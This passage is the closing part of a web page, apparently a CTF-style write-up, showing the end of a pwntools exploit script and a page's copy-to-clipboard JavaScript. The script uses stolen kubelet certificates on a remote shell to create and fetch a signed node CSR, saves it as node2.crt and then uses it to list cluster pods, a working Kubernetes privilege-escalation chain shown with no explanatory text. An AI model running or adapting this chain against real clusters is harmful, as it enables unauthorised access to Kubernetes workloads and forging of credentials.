    r.sendlineafter(b&#x22;$ &#x22;, b&#x22;kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} create -f k8shack.yaml&#x22;)
    log.success(r.recvuntil(b&#x22;$ &#x22;).decode())
    log.info(&#x22;waiting 5 secs&#x22;)
    time.sleep(5)
    r.sendline(b&#x22;kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get csr node-csr-&#x22; + str(certid).encode())
    log.success(r.recvuntil(b&#x22;$ &#x22;).decode())
    r.sendline(f&#x22;kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${{KUBERNETES_PORT_443_TCP_ADDR}} get csr node-csr-{certid} -o jsonpath=&#x27;{{.status.certificate}}&#x27; | base64 -d > node2.crt&#x22;.encode())

    r.sendlineafter(b&#x22;$ &#x22;, b&#x22;kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get pods -o wide&#x22;)
    r.interactive()


if __name__ == &#x22;__main__&#x22;:
    main()
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <script>/*! @uiw/copy-to-clipboard v1.0.12 | MIT (c) 2021 Kenny Wang | https://github.com/uiwjs/copy-to-clipboard.git */
!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):(e="undefined"!=typeof globalThis?globalThis:e||self).copyTextToClipboard=t()}(this,(function(){"use strict";return function(e,t){const o=document.createElement("textarea");o.value=e,o.setAttribute("readonly",""),o.style={position:"absolute",left:"-9999px"},document.body.appendChild(o);const n=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);o.select();let c=!1;try{c=!!document.execCommand("copy")}catch(e){c=!1}document.body.removeChild(o),n&&document.getSelection&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(n)),t&&t(c)}}));

function copied(target, str) {
  target.classList.add('active');
  copyTextToClipboard(target.dataset.code, function() {
    setTimeout(() => {
      target.classList.remove('active');
    }, 2000);
  });
}</script>
  </div></body>
</html>
